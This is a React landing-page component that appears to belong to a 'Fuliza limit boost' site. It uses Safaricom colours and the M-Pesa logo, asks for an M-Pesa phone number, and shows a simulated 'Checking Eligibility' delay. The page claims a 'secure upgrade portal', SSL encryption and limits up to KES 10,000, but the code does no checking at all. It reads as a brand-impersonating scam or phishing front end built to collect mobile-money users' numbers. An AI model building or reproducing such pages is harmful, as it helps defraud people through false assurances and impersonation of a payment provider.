
import React, { useState } from 'react';

interface LandingProps {
  onCheck: (phone: string) => void;
}

const Landing: React.FC<LandingProps> = ({ onCheck }) => {
  const [phone, setPhone] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (phone.length < 10) return;
    setLoading(true);
    // Mimic processing delay
    setTimeout(() => {
      onCheck(phone);
      setLoading(false);
    }, 1200);
  };

  return (
    <div className="flex-1 flex flex-col justify-center gap-8 animate-in fade-in slide-in-from-bottom-4 duration-700">
      <div className="text-center space-y-4">
        <h2 className="text-3xl font-extrabold text-gray-900 leading-tight">
          Boost Your Fuliza <br/>
          <span className="safaricom-green">Limit Instantly.</span>
        </h2>
        <p className="text-gray-500 text-lg">
          Unlock potential limits up to KES 10,000 with our secure upgrade portal.
        </p>
      </div>

      <div className="bg-white p-6 rounded-3xl shadow-xl shadow-gray-200/50 border border-gray-100">
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <label className="text-sm font-semibold text-gray-700 ml-1">M-Pesa Phone Number</label>
            <div className="relative">
              <input
                type="tel"
                placeholder="e.g. 0712345678"
                required
                value={phone}
                onChange={(e) => setPhone(e.target.value.replace(/\D/g, '').slice(0, 10))}
                className="w-full px-5 py-4 bg-gray-50 border border-gray-200 rounded-2xl text-lg font-medium focus:outline-none focus:ring-2 focus:ring-[#47B04B] focus:border-transparent transition-all"
              />
              <div className="absolute right-4 top-1/2 -translate-y-1/2">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/15/M-PESA_LOGO-01.svg/512px-M-PESA_LOGO-01.svg.png" alt="M-Pesa" className="h-5" />
              </div>
            </div>
          </div>

          <button
            type="submit"
            disabled={phone.length < 10 || loading}
            className={`w-full py-4 rounded-2xl font-bold text-white shadow-lg shadow-green-200 transition-all transform active:scale-[0.98] ${
              loading || phone.length < 10 ? 'bg-gray-300 cursor-not-allowed' : 'bg-safaricom-green hover:bg-[#3e9a41]'
            }`}
          >
            {loading ? (
              <div className="flex items-center justify-center gap-2">
                <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Checking Eligibility...
              </div>
            ) : 'Check Eligibility'}
          </button>
        </form>

        <p className="text-center text-xs text-gray-400 mt-6 px-4">
          By continuing, you authorize us to check your credit history and current Fuliza status.
        </p>
      </div>

      <div className="grid grid-cols-2 gap-4">
        <div className="bg-white p-4 rounded-2xl border border-gray-100 flex items-center gap-3">
          <div className="bg-green-50 p-2 rounded-lg">
            <svg className="w-5 h-5 text-[#47B04B]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
            </svg>
          </div>
          <div className="leading-tight">
            <p className="text-xs font-bold text-gray-900">Instant</p>
            <p className="text-[10px] text-gray-500">Auto-update</p>
          </div>
        </div>
        <div className="bg-white p-4 rounded-2xl border border-gray-100 flex items-center gap-3">
          <div className="bg-blue-50 p-2 rounded-lg">
            <svg className="w-5 h-5 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
            </svg>
          </div>
          <div className="leading-tight">
            <p className="text-xs font-bold text-gray-900">Secure</p>
            <p className="text-[10px] text-gray-500">SSL Encrypted</p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Landing;
